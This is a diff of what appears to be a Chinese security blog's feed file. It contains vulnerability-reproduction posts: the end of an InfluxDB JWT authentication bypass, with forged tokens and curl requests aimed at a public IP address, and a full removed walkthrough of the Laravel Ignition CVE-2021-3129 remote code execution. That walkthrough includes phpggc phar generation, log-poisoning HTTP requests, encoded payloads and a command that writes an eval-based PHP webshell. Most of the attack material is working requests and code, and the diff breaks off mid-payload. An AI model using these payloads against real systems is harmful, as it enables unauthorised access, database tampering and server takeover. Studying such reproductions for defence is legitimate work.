+<p>我们借助<a href="https://jwt.io/来生成jwt" target="_blank" rel="noopener">https://jwt.io/来生成jwt</a> token：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，需要设置为一个未来的时间戳。</p>
+<p>最终生成的token：</p>
+<p><img src="/images/image-20230910163906331.png" alt="image-20230910163906331"></p>
+<p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p>
+<p><img src="/images/image-20230910164310613.png" alt="image-20230910164310613"></p>
+<p>POC如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=show users&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k&apos;</span><br></pre></td></tr></table></figure>
+<p>利用效果如图，成功查询得到用户信息：</p>
+<p><img src="/images/image-20230910165023287.png" alt="image-20230910165023287"></p>
+<p>修改下PoC的利用方式，添加新的数据库：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=create database hacked&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk0MzM2NjYwfQ.ppl2b6_ddlOMionww8zs5x29EB2d2khQgNP1wWVQg6s&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910165748830.png" alt="image-20230910165748830"></p>
+<p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>JWT认证绕过</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</title>
     <url>/2022/12/09/Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(=jdk8u111)/</url>
     <content><![CDATA[<p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p>
@@ -496,105 +496,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</title>
-    <url>/2023/01/17/Laravel%20Ignition%202.5.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3129%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。</p>
-<blockquote>
-<p>Laravel Ignition 是一个强大的错误和异常处理工具，它能够提供更好的错误诊断和调试体验，为 Laravel 的错误页面提供了更友好和可读性更强的设计</p>
-</blockquote>
-<a id="more"></a>
-<p>在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[&apos;viewFile&apos;]);   #序列化</span><br><span class="line">file_put_contents($parameters[&apos;viewFile&apos;], $contents);    #反序列化</span><br></pre></td></tr></table></figure>
-<p>Laravel &lt;= 8.4.2 存在远程代码执行漏洞，当Laravel开启了Debug模式时，由于Laravel自带的2.5.2之前的Ignition功能的某些接口和函数存在过滤不严，未经过身份验证的远程攻击者可以发起恶意请求，通过<strong>构造恶意Log文件等方式触发phar反序列化，从而造成远程代码执行</strong>，控制服务器。</p>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></li>
-<li><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></li>
-<li><a href="https://www.freebuf.com/vuls/280416.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/280416.html</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1797520" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1797520</a></li>
-</ul>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Laravel&lt;=8.4.2</span><br><span class="line">Ignition&lt;2.5.2</span><br></pre></td></tr></table></figure>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个运行着Laravel 8.4.2和Ignition 2.5.1的应用：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-<p>环境启动后，访问<code>http://your-ip:8080</code>即可查看Laravel默认的欢迎页面。</p>
-<p><img src="/images/image-20230910194259406.png" alt="image-20230910194259406"></p>
-<p>点击<strong>Generate app key</strong>生成应用程序密钥<br>至此环境搭建完成</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>想要利用该漏洞需要有几个步骤：</p>
-<p>利用phpggc生成对应的phar文件→清空laravel.log → Log中增加前缀（填充字符，用于对齐），使得最终只出现一次 payload→将编码后的phar文件写入到log中→清除干扰字符→执行phar反序列化</p>
-<p><strong>验证漏洞是否存在</strong></p>
-<p>burpsuite抓取一个数据包，按照下图的形式修改并发送数据包</p>
-<p><img src="/images/image-20230910195124699.png" alt="image-20230910195124699"></p>
-<p>页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。</p>
-<p><strong>Laravel Debug mode RCE漏洞利用</strong></p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>一、利用phpggc生成对应的phar文件</p>
-<p>通过在laravel的依赖里面找一条能够rce的链，生成对应的phar文件，并将phar文件base64编码，再将该base64编码后的字符进行convert.quoted-printable-encode编码</p>
-<p>工具下载地址：git clone <a href="https://github.com/ambionics/phpggc.git" target="_blank" rel="noopener">https://github.com/ambionics/phpggc.git</a></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">php -d <span class="string">"phar.readonly=0"</span> ./phpggc/phpggc Laravel/RCE5 <span class="string">"phpinfo();"</span> --phar phar -o php:<span class="comment">//output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910200353296.png" alt="image-20230910200353296"></p>
-<p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p>
-<p><img src="https://img-blog.csdnimg.cn/dd8b1da0ee1046fb8a9ddb7a00e1c9be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p>二、清空laravel.log</p>
-<p>使用php://filter中的convert.base64-decode过滤器的特性，将log清空。</p>
-<p>发送如下数据包，将Laravel的原日志文件laravel.log清空：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910200633460.png" alt="image-20230910200633460"></p>
-<p>三、发送如下数据包，给Log增加一次前缀</p>
-<blockquote>
-<p><strong>如果出现两次 payload 或者出现部分残留的base64编码允许的字符将影响后续的base64解码</strong>。 可以通过在前后通过加填充字符的方式来调整 payload 的第一个字符下标为奇数 or 偶数，从而影响 utf16-&gt;utf8 的解码，来使得最终只出现一次 payload</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910200805099.png" alt="image-20230910200805099"></p>
-<p>四、将编码后的字符写入到log中</p>
-<p>将之前生成的编码后的POC作为viewFile的值，发送数据包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5058</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=48=00=4B=00=77=00=2F=00=57=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=45=00=44=00=33=00=75=00=36=00=2F=00=44=00=48=00=65=00=41=00=44=00=33=00=72=00=78=00=79=00=57=00=47=00=6E=00=46=00=34=00=6E=00=58=00=49=00=75=00=49=00=6D=00=43=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910201007691.png" alt="image-20230910201007691"></p>
-<p><img src="/images/image-20230910201656301.png" alt="image-20230910201656301"></p>
-<p>五、清空干扰字符只留下我们生成的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910201424924.png" alt="image-20230910201424924"></p>
-<p><strong>tips:</strong> 这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试</p>
-<p>六、触发phar反序列化</p>
-<p>使用phar://进行反序列化，执行任意代码（<strong>此时需要使用绝对路径</strong>）：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 210</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",</span></span><br><span class="line"><span class="comment">  "parameters": &#123;</span></span><br><span class="line"><span class="comment">    "variableName": "username",</span></span><br><span class="line"><span class="comment">    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910202053862.png" alt="image-20230910202053862"></p>
-<h4 id="蚁剑连接webshell"><a href="#蚁剑连接webshell" class="headerlink" title="蚁剑连接webshell"></a>蚁剑连接webshell</h4><p>我们可以利用该漏洞<strong>写入Webshell</strong>：</p>
-<p>1.利用phpggc生成对应的phar文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -d &quot;phar.readonly=0&quot; ./phpggc/phpggc Laravel/RCE5 &quot;system(&apos;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&apos;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&apos;&apos;.join([&apos;=&apos; + hex(ord(i))[2:] + &apos;=00&apos; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910202642109.png" alt="image-20230910202642109"></p>
-<p><img src="/images/image-20230910203108274.png" alt="image-20230910203108274"></p>
-<p>重复上述利用步骤后，即可连接Webshell ！</p>
-<p>2.清除laravel.log</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>3.给Log增加一次前缀<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>4.编码后的phar文件写入到log中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=52=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=62=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=63=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=31=00=70=00=59=00=57=00=6D=00=68=00=69=00=51=00=32=00=64=00=72=00=57=00=44=00=46=00=43=00=55=00=46=00=55=00=78=00=55=00=6D=00=4A=00=6B=00=4D=00=6D=00=68=00=32=00=57=00=56=00=63=00=78=00=63=00=46=00=68=00=54=00=61=00=7A=00=64=00=51=00=65=00=6A=00=51=00=39=00=66=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=49=00=43=00=39=00=32=00=59=00=58=00=49=00=76=00=64=00=33=00=64=00=33=00=4C=00=32=00=68=00=30=00=62=00=57=00=77=00=76=00=63=00=3